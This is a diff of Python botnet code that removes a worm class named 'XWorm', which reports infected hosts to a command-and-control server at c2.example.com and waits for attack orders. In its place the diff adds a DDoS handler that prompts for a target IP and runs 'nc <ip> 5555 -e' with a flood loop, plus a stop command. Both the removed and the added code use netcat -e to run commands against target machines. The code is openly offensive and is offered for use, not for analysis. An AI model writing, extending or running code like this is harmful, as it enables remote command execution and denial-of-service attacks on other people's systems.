@@ -1,53 +1,8 @@
 import socket
 import threading
-import time
-import random
-import os
 import subprocess
+import time
 import pickle
-
-class XWorm:
-    def __init__(self, c2_host, c2_port, attack_target, attack_type):
-        self.c2_host = c2_host
-        self.c2_port = c2_port
-        self.attack_target = attack_target
-        self.attack_type = attack_type
-        self.host = socket.gethostbyname(socket.gethostname())
-        self.port = random.randint(1024, 65535)
-        self.c2_socket = None
-
-    def connect_to_c2(self):
-        try:
-            self.c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.c2_socket.connect((self.c2_host, self.c2_port))
-            print(f"Connected to C2 server at {self.c2_host}:{self.c2_port}")
-        except Exception as e:
-            print(f"Failed to connect to C2 server: {e}")
-
-    def send_infection_data(self):
-        try:
-            infection_data = f"{self.host}:{self.port}"
-            self.c2_socket.send(infection_data.encode("utf-8"))
-            print(f"Sent infection data to C2 server: {infection_data}")
-        except Exception as e:
-            print(f"Failed to send infection data: {e}")
-
-    def receive_commands(self):
-        while True:
-            try:
-                command = self.c2_socket.recv(1024).decode("utf-8")
-                if command == "ATTACK":
-                    self.execute_attack()
-            except Exception as e:
-                print(f"Error receiving commands: {e}")
-
-    def execute_attack(self):
-        print(f"Executing attack on {self.attack_target} with {self.attack_type}")
-        # Write your attack code here
-
-    def spread_infection(self):
-        print("Attempting to spread infection on the network")
-        # Write your infection code here
 
 class ServerThread(threading.Thread):
     def __init__(self, s):
@@ -65,6 +20,8 @@ class ServerThread(threading.Thread):
                     self.handle_disconnect()
                 elif cmd == "COM_ATTACK":
                     self.handle_attack()
+                elif cmd == "COM_STOP":
+                    self.handle_stop()
             except Exception as e:
                 print(e)
                 self.s.close()
@@ -73,6 +30,7 @@ class ServerThread(threading.Thread):
     def handle_connect(self):
         print("Client {} connected".format(self.s.getpeername()))
         self.s.send(pickle.dumps(("ACK_CONNECT", )))
+        print("Connection successful!")
         ServerThread(self.s).start()
 
     def handle_disconnect(self):
@@ -80,14 +38,24 @@ class ServerThread(threading.Thread):
         print("Client {} disconnected".format(self.s.getpeername()))
 
     def handle_attack(self):
-        target_ips = {"target_ips"}  # replace this line with the list of target IPs
-        for command in {"shell_commands"}:  # replace this line with the list of shell commands
-            for target_ip in target_ips:
-                command_ip = "{}.{}".format(target_ip.split('.')[0], str(int(target_ip.split('.')[3]) + 1)) if len(target_ip.split('.')) == 4 else target_ip
-                spine = ['nc', target_ip, str(5555), '-e', command]
-                subprocess.call(spine)
-                time.sleep(3)
+        target_ip = input("Enter IP to attack: ")
+        print(f"Launching DDOS attack on {target_ip}...")
+        try:
+            spine = ['nc', target_ip, str(5555), '-e', 'while true; do echo flood; done']
+            subprocess.call(spine)
+            print(f"Attack on {target_ip} successful!")
+        except Exception as e:
+            print(f"Attack on {target_ip} failed: {e}")
         self.s.send(pickle.dumps(("ACK_ATTACK", )))
+
+    def handle_stop(self):
+        print("Stopping DDOS attack...")
+        try:
+            subprocess.call(['pkill', 'nc'])
+            print("DDOS attack stopped successfully!")
+        except Exception as e:
+            print(f"Failed to stop DDOS attack: {e}")
+        self.s.send(pickle.dumps(("ACK_STOP", )))
 
 def have_ssh(ip):
     try:
@@ -128,19 +96,5 @@ def main():
                     subprocess.call(spine)
                 time.sleep(1)
 
-if __name__ == "__main__":
-    c2_host = "c2.example.com"
-    c2_port = 1337
-
-    worm = XWorm(c2_host, c2_port, "example.com", "HTTP Flood")
-    worm.connect_to_c2()
-    worm.send_infection_data()
-
-    infection_thread = threading.Thread(target=worm.spread_infection)
-    infection_thread.start()
-
-    # Start a new thread to receive commands
-    receive_thread = threading.Thread(target=worm.receive_commands)
-    receive_thread.start()
-
+if __name__ == '__main__':
     main()
